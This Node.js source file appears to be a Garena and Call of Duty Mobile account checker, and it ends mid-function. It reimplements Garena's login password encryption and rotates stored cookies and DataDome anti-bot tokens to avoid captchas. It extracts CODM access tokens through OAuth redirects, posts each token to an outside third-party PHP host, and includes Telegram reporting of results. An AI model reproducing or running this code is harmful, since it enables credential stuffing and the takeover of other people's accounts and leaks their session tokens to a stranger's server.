// server.js
const os = require('os');

const sys = {
    exit: (code) => {
        const message = `sys.exit(${code}) called. This indicates a critical issue. In API, throwing error.`;
        console.warn(message);
        const err = new Error(`EXIT_REQUESTED_CODE_${code}`);
        err.isSysExit = true;
        err.exitCode = code;
        throw err;
    },
    stdout: process.stdout,
    stderr: process.stderr,
    version: process.version,
};

const time = {
    sleep: (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000)),
};

const hashlib = require('crypto-js');

const random = {
    randint: (a, b) => Math.floor(Math.random() * (b - a + 1)) + a,
    choice: (arr) => {
        if (!arr || arr.length === 0) return undefined;
        return arr[Math.floor(Math.random() * arr.length)];
    },
};

const logging = {
    DEBUG: 10, INFO: 20, WARNING: 30, ERROR: 40, CRITICAL: 50,
    _level: 20,
    _log_file_path: null,
    _fs: require('fs'),
    _path: require('path'),

    basicConfig: ({ level, handlers }) => {
        if (level !== undefined) logging._level = level;
        if (handlers && Array.isArray(handlers)) {
            for (const handler of handlers) {
                if (handler instanceof FileHandler && handler.filename) {
                    logging._log_file_path = handler.filename;
                    try {
                        const logDir = logging._path.dirname(logging._log_file_path);
                        if (!logging._fs.existsSync(logDir)) {
                            logging._fs.mkdirSync(logDir, { recursive: true });
                        }
                    } catch (e) { console.error("Error creating log directory:", e.message); }
                }
            }
        }
    },
    _log: (level, levelName, args) => {
        if (level >= logging._level) {
            const messageContent = args.map(arg => {
                if (arg instanceof Error) return arg.stack || arg.message;
                if (typeof arg === 'object' && arg !== null) {
                    try { return JSON.stringify(arg, null, 2); }
                    catch (e) { return '[Unserializable Object]'; }
                }
                return String(arg);
            }).join(' ');

            const timestamp = new Date().toISOString();
            const logMessage = `${timestamp} - ${levelName} - ${messageContent}`;

            if (level >= logging.ERROR) console.error(logMessage);
            else if (level === logging.WARNING) console.warn(logMessage);
            else console.log(logMessage);

            if (logging._log_file_path) {
                try {
                    logging._fs.appendFileSync(logging._log_file_path, logMessage + '\n', 'utf-8');
                } catch (e) { console.error("Error writing to log file:", e.message); }
            }
        }
    },
    debug: (...args) => logging._log(logging.DEBUG, 'DEBUG', args),
    info: (...args) => logging._log(logging.INFO, 'INFO', args),
    warning: (...args) => logging._log(logging.WARNING, 'WARNING', args),
    error: (...args) => logging._log(logging.ERROR, 'ERROR', args),
    critical: (...args) => logging._log(logging.CRITICAL, 'CRITICAL', args),
    exception: (...args) => {
        let msgParts = [];
        let errStack = '';
        for (const arg of args) {
            if (arg instanceof Error) errStack = arg.stack || String(arg);
            else msgParts.push((typeof arg === 'object' && arg !== null) ? JSON.stringify(arg, null, 2) : String(arg));
        }
        const message = msgParts.join(' ');
        const finalLogMessage = message && errStack ? `${message}\n${errStack}` : (errStack || message || "Exception logged.");
        logging._log(logging.ERROR, 'ERROR', [finalLogMessage]);
    },
    getLevelName: (level) => {
        for (const name in logging) {
            if (logging[name] === level && typeof logging[name] === 'number') return name;
        }
        return String(level);
    },
    getLogger: () => ({ level: logging._level })
};

class FileHandler {
    constructor(filename, encoding = 'utf-8') {
        this.filename = filename;
        this.encoding = encoding;
    }
}
logging.FileHandler = FileHandler;

const NativeUrlModule = require('url');
const urllib = {
    request: require('axios'),
    parse: {
        quote: encodeURIComponent,
        unquote: decodeURIComponent,
        urlencode: (params) => {
            if (typeof params !== 'object' || params === null) return '';
            return new URLSearchParams(params).toString();
        },
        urlparse: (urlString) => {
            try { return new URL(urlString); }
            catch (e) { return NativeUrlModule.parse(urlString); }
        },
        parse_qs: (qs) => {
            if (typeof qs !== 'string') return {};
            return Object.fromEntries(new URLSearchParams(qs));
        },
    }
};

const axios = require('axios');
const fs = require('fs');
const fsExtra = require('fs-extra');
const path = require('path');
const crypto = require('crypto'); // Node's crypto module

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
axiosCookieJarSupport(axios);

const Fore = {
    RED: '\x1b[31m', GREEN: '\x1b[32m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', LIGHTBLACK_EX: '\x1b[90m',
};
const Style = { BRIGHT: '\x1b[1m', RESET_ALL: '\x1b[0m', DIM: '\x1b[2m', };
const Back = { RED: '\x1b[41m', };

const COLORS = {
    "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW, "BLUE": Fore.BLUE,
    "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN, "WHITE": Fore.WHITE, "GREY": Fore.LIGHTBLACK_EX,
    "BOLD": Style.BRIGHT, "RESET": Style.RESET_ALL, "HIGHLIGHT": "\x1b[7m",
    "RED_BG": Style.BRIGHT + Fore.WHITE + Back.RED,
    "BLUE_BOLD": Fore.BLUE + Style.BRIGHT,
};

const { DateTime, Settings } = require('luxon');
Settings.defaultZone = 'utc';

try {
    if (!crypto || typeof crypto.createCipheriv !== 'function') {
      throw new Error("Node.js crypto module is not available or incomplete.");
    }
} catch (e) {
    console.error(`${COLORS.RED_BG}ERROR: CRYPTO MODULE NOT FOUND. ${e.message}${COLORS.RESET}`);
    sys.exit(1);
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";

const DATADOME_JSON_FILE = path.resolve(__dirname, ".datadome.json");
const MAX_DATADOMES_IN_JSON = 20;
const NEW_COOKIES_JSON_FILE = path.resolve(__dirname, ".newCookies.json");
const MAX_COOKIE_SETS_IN_JSON = 20;
const REQUEST_TIMEOUT = 30; // seconds

const GARENA_COUNTRY_MAP = {
    "ID": "INDONESIA", "SG": "SINGAPORE", "MY": "MALAYSIA", "PH": "PHILIPPINES", "TH": "THAILAND", "VN": "VIETNAM",
    "TW": "TAIWAN", "INDIA": "INDIA", "IND": "INDIA", "INDONESIA": "INDONESIA", "SINGAPORE": "SINGAPORE",
    "MALAYSIA": "MALAYSIA", "PHILIPPINES": "PHILIPPINES", "THAILAND": "THAILAND", "VIETNAM": "VIETNAM",
    "TAIWAN": "TAIWAN", "US": "UNITED STATES", "UNITED STATES": "UNITED STATES", "BR": "BRAZIL", "BRAZIL": "BRAZIL",
};

const APK_URL = "https://auth.garena.com/api/login";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

class _HardcodedCookies { // Intended for initial seeding or fallback
    static get_cookies() { return {}; } // Provide some default if needed, e.g. {}
}

function load_json_from_file(filePath, logName = "data") {
    if (!fs.existsSync(filePath)) return [];
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        if (!fileContent.trim()) return [];
        return JSON.parse(fileContent);
    } catch (e) {
        logging.error(`Error loading ${logName} from ${filePath}: ${e.message}`);
        return [];
    }
}

function save_json_to_file(filePath, data, logName = "data") {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf-8');
        logging.info(`Saved/Updated ${logName} to ${filePath}`);
    } catch (e) {
        logging.error(`Error writing ${logName} to ${filePath}: ${e.message}`);
    }
}

function load_cookie_sets_from_storage() {
    const data = load_json_from_file(NEW_COOKIES_JSON_FILE, "cookie sets");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'object' && item !== null && Object.keys(item).length > 0);
    }
    logging.warning(`${path.basename(NEW_COOKIES_JSON_FILE)} does not contain a list of cookie sets.`);
    return [];
}

function save_cookie_set_to_storage(new_cookie_set) {
    if (typeof new_cookie_set !== 'object' || new_cookie_set === null || Object.keys(new_cookie_set).length === 0) {
        logging.debug("Attempted to save an empty or invalid cookie set. Skipping.");
        return;
    }
    let cookie_sets = load_cookie_sets_from_storage();
    const newCookieSetString = JSON.stringify(new_cookie_set);
    if (!cookie_sets.some(cs => JSON.stringify(cs) === newCookieSetString)) {
        cookie_sets.push(new_cookie_set);
        while (cookie_sets.length > MAX_COOKIE_SETS_IN_JSON) {
            cookie_sets.shift();
        }
        save_json_to_file(NEW_COOKIES_JSON_FILE, cookie_sets, "cookie sets");
    }
}

function starting_cookies() {
    let cookies_to_use = null;
    let source_message = "Initializing cookies: ";

    const given_cookies = _HardcodedCookies.get_cookies();
    if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
        save_cookie_set_to_storage(given_cookies);
        source_message += "Processed hardcoded cookies. ";
    } else {
        source_message += "No valid hardcoded cookies. ";
    }

    try {
        const changeCookiePath = path.join(__dirname, 'change_cookie.js');
        if (fs.existsSync(changeCookiePath)) {
            const change_cookie = require(changeCookiePath);
            if (change_cookie && typeof change_cookie.get_cookies === 'function') {
                const session_cookies = change_cookie.get_cookies();
                if (typeof session_cookies === 'object' && session_cookies !== null && Object.keys(session_cookies).length > 0) {
                    cookies_to_use = session_cookies;
                    source_message += "Using cookies from 'change_cookie.js'. ";
                    save_cookie_set_to_storage(cookies_to_use);
                } else {
                    logging.warning("'change_cookie.get_cookies()' returned invalid data.");
                    source_message += "'change_cookie.js' provided invalid cookies. ";
                }
            } else {
                logging.warning("'change_cookie.js' found, but 'get_cookies' is missing or not a function.");
                source_message += "'change_cookie.js' invalid structure. ";
            }
        } else {
             source_message += "Optional 'change_cookie.js' not found. ";
        }
    } catch (e) {
        logging.error(`Error with 'change_cookie.js': ${e.message}.`);
        source_message += `Error with 'change_cookie.js': ${e.message.substring(0,30)}. `;
    }

    if (!cookies_to_use) {
        const stored_cookie_sets = load_cookie_sets_from_storage();
        if (stored_cookie_sets.length > 0) {
            cookies_to_use = random.choice(stored_cookie_sets);
            if (cookies_to_use) {
                source_message += `Using random stored cookie set from '${path.basename(NEW_COOKIES_JSON_FILE)}'. `;
            } else {
                 logging.warning(`Could not select a cookie from '${path.basename(NEW_COOKIES_JSON_FILE)}'.`);
                 source_message += `Failed to pick from stored cookies. `;
            }
        } else {
            source_message += `No valid cookie sets in '${path.basename(NEW_COOKIES_JSON_FILE)}'. `;
        }
    }

    if (!cookies_to_use) {
        if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
            cookies_to_use = given_cookies;
            source_message += "Using 'given' (hardcoded) cookies as fallback. ";
        } else {
            logging.error("All cookie sources failed. Using empty cookies.");
            cookies_to_use = {};
            source_message += "All cookie sources failed; using empty set. ";
        }
    }
    
    if (typeof cookies_to_use !== 'object' || cookies_to_use === null) { 
        logging.critical(`Cookies became non-object. Resetting to empty. Prev source: ${source_message}`);
        cookies_to_use = {};
        source_message += " (CRITICAL_FALLBACK: reset to empty)";
    }

    logging.info(source_message);
    return [cookies_to_use, source_message]; // source_message is for debug logging context
}

function strip_ansi_codes(text) {
    if (typeof text !== 'string') return String(text);
    const ansi_escape = /\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g;
    return text.replace(ansi_escape, '');
}

function get_current_timestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generate_md5_hash(password) {
    if (typeof password !== 'string') password = String(password);
    return hashlib.MD5(password).toString(hashlib.enc.Hex);
}

function generate_decryption_key(password_md5, v1, v2) {
    const intermediate_hash = hashlib.SHA256(String(password_md5) + String(v1)).toString(hashlib.enc.Hex);
    return hashlib.SHA256(intermediate_hash + String(v2)).toString(hashlib.enc.Hex);
}

function encrypt_aes_256_ecb(plaintext_hex, key_hex) {
    try {
        const keyBuffer = Buffer.from(key_hex, 'hex');
        if (keyBuffer.length !== 32) {
            throw new Error(`AES key must be 32 bytes, got ${keyBuffer.length}.`);
        }
        const plaintextBuffer = Buffer.from(plaintext_hex, 'hex');
        const blockSize = 16;
        let paddedPlaintext = plaintextBuffer;
         // Manual PKCS7-like padding if not multiple of block size
        if (plaintextBuffer.length % blockSize !== 0) {
             const paddingLength = blockSize - (plaintextBuffer.length % blockSize);
             const paddingBuffer = Buffer.alloc(paddingLength, paddingLength);
             paddedPlaintext = Buffer.concat([plaintextBuffer, paddingBuffer]);
        }

        const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null);
        cipher.setAutoPadding(false); 
        let encrypted = cipher.update(paddedPlaintext, null, 'hex');
        encrypted += cipher.final('hex');
        return encrypted.substring(0, 32); // Truncate
    } catch (e) {
         const safePlaintext = typeof plaintext_hex === 'string' ? plaintext_hex.substring(0,10) : 'N/A';
         const safeKey = typeof key_hex === 'string' ? key_hex.substring(0,10) : 'N/A';
         logging.error(`AES ENCRYPTION ERROR: ${e.message}. PLAINTEXT_HEX: ${safePlaintext}..., KEY_HEX: ${safeKey}...`);
         throw e;
    }
}

function get_encrypted_password(password, v1, v2) {
    const password_md5 = generate_md5_hash(password);
    const decryption_key_hex = generate_decryption_key(password_md5, v1, v2);
    return encrypt_aes_256_ecb(password_md5, decryption_key_hex);
}

function get_request_data(initial_cookies_tuple) {
    let [cookies] = initial_cookies_tuple;
    if (typeof cookies !== 'object' || cookies === null) {
        logging.warning("get_request_data received non-object cookies. Using empty object.");
        cookies = {};
    }
    const user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36';
    const headers = {
        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'User-Agent': user_agent, 'sec-ch-ua-platform': '"Windows"',
        'Accept': 'application/json, text/plain, */*', 'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + urllib.parse.quote(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
    };
    return [cookies, headers];
}

function detect_captcha_in_response(response_text) {
    return typeof response_text === 'string' && response_text.toLowerCase().includes("captcha");
}

async function get_public_ip(timeout = REQUEST_TIMEOUT) {
    const axiosConfig = { timeout: timeout * 1000 };
    try {
        const response = await axios.get('https://api.ipify.org?format=json', axiosConfig);
        if (response.status !== 200 || !response.data || typeof response.data.ip !== 'string') {
            throw new Error(`HTTP error ${response.status} or invalid IP data`);
        }
        return response.data.ip;
    } catch (e) {
        logging.warning(`COULD NOT FETCH PUBLIC IP: ${e.message}`);
        return `IP FETCH ERROR (${e.constructor.name})`;
    }
}

function load_datadomes_from_storage() {
    const data = load_json_from_file(DATADOME_JSON_FILE, "datadomes");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'string' && item.trim().length > 0);
    }
    logging.warning(`${path.basename(DATADOME_JSON_FILE)} does not contain a list of datadomes.`);
    return [];
}

function save_datadome_to_storage(new_datadome) {
    if (typeof new_datadome !== 'string' || !new_datadome.trim()) {
        logging.debug("Attempted to save an empty or invalid datadome. Skipping.");
        return;
    }
    if (new_datadome.startsWith("[🤖]") || new_datadome.startsWith("[⚠️]")) {
        logging.warning(`Attempted to save an error/captcha string as a datadome: ${new_datadome.substring(0, 50)}`);
        return;
    }
    let datadomes = load_datadomes_from_storage();
    if (!datadomes.includes(new_datadome)) {
        datadomes.push(new_datadome);
        while (datadomes.length > MAX_DATADOMES_IN_JSON) {
            datadomes.shift();
        }
        save_json_to_file(DATADOME_JSON_FILE, datadomes, "datadomes");
    }
}

async function send_telegram_message(message_text, bot_token, chat_id) {
    if (!bot_token || !chat_id || bot_token === "YOUR_TELEGRAM_BOT_TOKEN" || chat_id === "YOUR_TELEGRAM_CHAT_ID") {
        logging.warning("TELEGRAM BOT TOKEN OR CHAT ID IS NOT CONFIGURED OR USING PLACEHOLDERS. SKIPPING MESSAGE SENDING.");
        return { success: false, error: "Telegram not configured." };
    }
    if (typeof message_text !== 'string' || !message_text.trim()) {
        logging.warning("Cannot send empty message to Telegram.");
        return { success: false, error: "Empty message." };
    }

    logging.info(`Attempting to send message to Telegram chat ID ${String(chat_id).substring(0,4)}...`);
    const api_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
    
    try {
        const response = await axios.post(api_url, {
            chat_id: chat_id,
            text: message_text,
        }, {
            timeout: 15000
        });
        
        if (response.data && response.data.ok) {
            logging.info(`Successfully sent message to Telegram: "${message_text.substring(0, 70)}..."`);
            return { success: true, result: response.data.result };
        } else {
            const error_desc = response.data && response.data.description ? response.data.description : 'Unknown Telegram API error';
            logging.error(`Failed to send message to Telegram: ${error_desc}`);
            return { success: false, error: error_desc, response_data: response.data };
        }
    } catch (e) {
        let error_message = e.message;
        if (e.code === 'ECONNABORTED' || (e.response && e.response.status === 408) ) {
             error_message = `Timeout sending message to Telegram.`;
        } else if (e.isAxiosError) {
             error_message = `Network/Request error sending message to Telegram: ${strip_ansi_codes(e.message)}`;
             if(e.response && e.response.data) logging.error(`Telegram Response: ${JSON.stringify(e.response.data)}`);
        } else {
             error_message = `Unexpected error sending message to Telegram: ${e.message}`;
        }
        logging.error(error_message, e);
        return { success: false, error: error_message, details: e };
    }
}

async function get_datadome_cookie(timeout = REQUEST_TIMEOUT) {
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd', 'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'pragma': 'no-cache', 'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': JSON.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4', 'Referer': 'https://account.garena.com/',
        'request': '%2F', 'responsePage': 'origin',
    };
    const data = urllib.parse.urlencode(payload);
    const axiosConfig = { headers: headers, timeout: timeout * 1000 };
    
    try {
        const response = await axios.post(url, data, axiosConfig);
        let response_json;
        let raw_response_data_str = "";

        if (typeof response.data === 'string') {
            raw_response_data_str = strip_ansi_codes(response.data);
            try { response_json = JSON.parse(raw_response_data_str); }
            catch (e) {
                if (detect_captcha_in_response(raw_response_data_str)) {
                    logging.warning(`CAPTCHA IN DATADOME (NON-JSON STRING): ${raw_response_data_str.substring(0, 200)}`);
                    return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
                }
                logging.error(`Failed to parse datadome string response: ${e.message}. Snippet: ${raw_response_data_str.substring(0, 200)}`);
                return `[⚠️] DATADOME ERROR: NON-JSON RESPONSE (${e.message.substring(0,50)})`;
            }
        } else if (typeof response.data === 'object' && response.data !== null) {
            response_json = response.data;
            try { raw_response_data_str = strip_ansi_codes(JSON.stringify(response_json)); }
            catch (e) { raw_response_data_str = "[Unstringifiable JSON Object]";}
        } else {
            logging.error(`Unexpected datadome response type: ${typeof response.data}. Status: ${response.status}`);
            return `[⚠️] DATADOME ERROR: UNEXPECTED RESPONSE DATA TYPE (${typeof response.data})`;
        }

        if (detect_captcha_in_response(raw_response_data_str)) {
            logging.warning(`CAPTCHA IN DATADOME RESPONSE: ${raw_response_data_str.substring(0,200)}`);
            return "[🤖] CAPTCHA DETECTED (DATADOME PARSED/STRINGIFIED)";
        }
        if (response.status < 200 || response.status >= 300) { 
             throw new Error(`Datadome HTTP error ${response.status}. Body: ${raw_response_data_str.substring(0,200)}`);
        }

        if (response_json && response_json.cookie) {
            const cookie_string = response_json.cookie;
            const match = /datadome=([^;]+)/.exec(cookie_string);
            if (match && match[1]) {
                const datadome_value = match[1];
                save_datadome_to_storage(datadome_value);
                return datadome_value;
            }
        }
        logging.warning(`Datadome response missing cookie: ${raw_response_data_str.substring(0,300)}`);
        return `[⚠️] DATADOME MISSING COOKIE FIELD`;
    } catch (e) {
        const error_str = strip_ansi_codes(e.message);
        const resp_text_snippet = strip_ansi_codes(e.response && e.response.data ? String(e.response.data).substring(0,100) : "");

        if (detect_captcha_in_response(error_str) || detect_captcha_in_response(resp_text_snippet)) {
             logging.warning(`CAPTCHA during datadome request/parse error: ${error_str} / ${resp_text_snippet}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
        }
        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
            logging.error(`Timeout getting datadome cookie: ${error_str}`);
            return "[⏱️] DATADOME TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { 
            logging.error(`Connection error getting datadome cookie: ${error_str}`);
            return "[🔴] DATADOME CONNECTION ERROR";
        }
        logging.exception(`Failed to get datadome cookie:`, e);
        return `[⚠️] DATADOME ERROR: ${error_str.substring(0,100)}`;
    }
}

function parseSetCookies(setCookieHeader) {
    if (!setCookieHeader) return {};
    const cookies = {};
    try {
        const setCookieParser = require('set-cookie-parser');
        const parsed = setCookieParser.parse(setCookieHeader, { map: true });
        for (const name in parsed) {
            cookies[name] = parsed[name].value;
        }
    } catch (e) {
        logging.error(`Error parsing Set-Cookie: ${e.message}. Header: ${String(setCookieHeader).substring(0,100)}`);
    }
    return cookies;
}

function parseAxiosResponseData(responseData, context = "Response") {
    if (typeof responseData === 'object' && responseData !== null) {
        return { data: responseData, error: null, raw: null }; // raw can be JSON.stringify if needed
    }
    if (typeof responseData === 'string') {
        const cleanData = strip_ansi_codes(responseData);
        try {
            return { data: JSON.parse(cleanData), error: null, raw: cleanData };
        } catch (e) {
            return { data: null, error: e, raw: cleanData };
        }
    }
    const err = new Error(`Unexpected ${context} data type: ${typeof responseData}`);
    return { data: null, error: err, raw: String(responseData) };
}

async function show_level(access_token, selected_header, cookies_for_codm, timeout = REQUEST_TIMEOUT) {
    const callback_base_url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callback_params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token};
    let headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/", "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) headers[key] = selected_header[key];
        }
    }

    let current_cookies = { ...(cookies_for_codm || {}) };
    let extracted_token = null;

    try {
        let current_url = callback_base_url;
        let current_params_obj = { ...callback_params };
        let redirect_count = 0;
        const max_redirects = 7;

        while (redirect_count < max_redirects) {
            const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const axiosConfig = {
                headers: {...headers, 'Cookie': cookieString },
                params: current_params_obj, maxRedirects: 0, timeout: timeout * 1000,
                validateStatus: (status) => status >= 200 && status < 400 || [301, 302, 303, 307, 308].includes(status),
            };

            const response = await axios.get(current_url, axiosConfig);
            const { raw: response_text_clean } = parseAxiosResponseData(response.data, "CODM callback");
            const newCookiesFromResponse = parseSetCookies(response.headers['set-cookie']);
            current_cookies = { ...current_cookies, ...newCookiesFromResponse };

            if (detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA IN CODM callback (URL: ${current_url.substring(0,100)}...)`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT BODY)";
            }

            if ([301, 302, 303, 307, 308].includes(response.status)) {
                const redirect_url_header = response.headers['location'] || response.headers['Location'];
                if (!redirect_url_header) {
                    logging.error("CODM REDIRECT but no Location header.");
                    return "[CODM FAIL] REDIRECT NO LOCATION HEADER";
                }
                const parsedCurrentUrl = new URL(current_url);
                current_url = new URL(redirect_url_header, parsedCurrentUrl.origin + parsedCurrentUrl.pathname).toString();
                current_params_obj = null;
                redirect_count += 1;
                logging.debug(`CODM Redirect #${redirect_count}: to ${current_url.substring(0,100)}...`);
                await time.sleep(0.2);
            } else if (response.status >= 200 && response.status < 300) {
                const final_url = response.request.res.responseUrl || current_url;
                const parsed_final_url = new URL(final_url);
                const query_params = Object.fromEntries(parsed_final_url.searchParams);
                extracted_token = query_params.token || null;

                if (!extracted_token && response_text_clean) {
                     const match = /["']token["']\s*:\s*["']([\w\-.]+)["']/.exec(response_text_clean);
                     if (match && match[1]) extracted_token = match[1];
                }
                if (!extracted_token) {
                     logging.warning(`CODM TOKEN EXTRACTION FAILED. Final URL: ${final_url}, Status: ${response.status}, Body: ${String(response_text_clean).substring(0,200)}`);
                     return "[CODM FAIL] COULD NOT EXTRACT CODM TOKEN";
                }
                break;
            } else {
                throw new Error(`Unexpected status ${response.status} in CODM callback`);
            }
        }

        if (redirect_count >= max_redirects) {
            logging.error("MAX REDIRECTS in CODM callback.");
            return "[CODM FAIL] MAXIMUM REDIRECTS REACHED";
        }
        if (!extracted_token) {
            logging.error("CODM TOKEN NULL post-redirects.");
            return "[CODM FAIL] TOKEN NULL POST-REDIRECTS";
        }

        const external_codm_script = "https://suneoxjarell.x10.bz/jajac.php";
        const payload_for_script = { "user_agent": headers["User-Agent"], "extracted_token": extracted_token };
        const script_headers = {"Content-Type": "application/json", "User-Agent": headers["User-Agent"]};

        try {
            const response_codm = await axios.post(external_codm_script, payload_for_script, {
                headers: script_headers, timeout: timeout * 1000
            });
            const { raw: script_raw_text } = parseAxiosResponseData(response_codm.data, "CODM external script");
            const response_codm_text_clean = script_raw_text ? script_raw_text.trim() : "";

            if (detect_captcha_in_response(response_codm_text_clean)) {
                 logging.warning("CAPTCHA in external CODM script response.");
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT RESPONSE)";
            }
            if (response_codm.status < 200 || response_codm.status >= 300) {
                throw new Error(`External CODM script HTTP error ${response_codm.status}. Body: ${response_codm_text_clean.substring(0,150)}`);
            }
            if (response_codm_text_clean.includes("|") && response_codm_text_clean.split("|").length === 4) {
                const parts = response_codm_text_clean.split("|");
                if (/^\d+$/.test(parts[1]) && parts.every(p => p && p.trim() !== "" && p.trim().toLowerCase() !== "n/a")) {
                     logging.info(`CODM script success: ${response_codm_text_clean}`);
                     return response_codm_text_clean;
                } else {
                     logging.warning(`CODM script invalid data: ${response_codm_text_clean}`);
                     return `[CODM WARN] SCRIPT DATA INVALID: ${response_codm_text_clean.substring(0,100)}`;
                }
            } else {
                 const lc_response = response_codm_text_clean.toLowerCase();
                 if (lc_response.includes("not found") || lc_response.includes("invalid token")) {
                     logging.warning(`CODM script: not linked/invalid token: ${response_codm_text_clean}`);
                     return `[CODM FAIL] ACCOUNT NOT LINKED/TOKEN INVALID`;
                 } else if (lc_response.includes("error") || lc_response.includes("fail")) {
                      logging.warning(`CODM script returned error: ${response_codm_text_clean}`);
                      return `[CODM FAIL] SCRIPT ERROR: ${response_codm_text_clean.substring(0,150)}`;
                 } else {
                      logging.warning(`CODM script unexpected format: ${response_codm_text_clean}`);
                      return `[CODM WARN] SCRIPT UNEXPECTED FORMAT: ${response_codm_text_clean.substring(0,100)}`;
                 }
            }
        } catch (e) {
             const err_str = strip_ansi_codes(e.message);
             const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
             if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
                 logging.warning(`CAPTCHA during external CODM script request error: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT REQUEST ERROR)";
             }
             if (e.code === 'ECONNABORTED') return "[⏱️] [CODM FAIL] CODM CHECK SCRIPT TIMEOUT";
             logging.exception(`Error contacting CODM check script:`, e);
             return `[CODM FAIL] SCRIPT REQUEST ERROR: ${err_str.substring(0,100)}`;
        }
    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const status_code = e.response ? e.response.status : null;
        const error_detail = `${err_str.substring(0,100)}` + (status_code ? ` (STATUS: ${status_code})` : "");

        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA during CODM callback request error: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (CODM CALLBACK REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error("CODM callback request timed out.");
            return "[⏱️] [CODM FAIL] CODM CALLBACK TIMEOUT";
        }
        logging.exception(`CODM callback/token fetch error:`, e);
        return `[CODM FAIL] CALLBACK ERROR: ${error_detail}`;
    }
}

async function check_login(account_username, _id, encryptedpassword, password_for_result, selected_header, cookies, dataa_datadome, date, timeout = REQUEST_TIMEOUT) {
    let current_cookies = { ...(cookies || {}) };
    const safe_username = String(account_username || "UNKNOWN_USER").substring(0, 5);

    if (dataa_datadome) {
        current_cookies["datadome"] = dataa_datadome;
    } else {
        logging.info(`No datadome for ${safe_username}, fetching one.`);
        const manual_datadome_result = await get_datadome_cookie(timeout);
        if (typeof manual_datadome_result === 'string' && !/^\[[🤖⚠️⏱️🔴📉]\]/.test(manual_datadome_result)) { // Added 📉
            current_cookies["datadome"] = manual_datadome_result;
            logging.info(`Fetched datadome for ${safe_username}.`);
        } else if (manual_datadome_result && manual_datadome_result.startsWith("[🤖]")) {
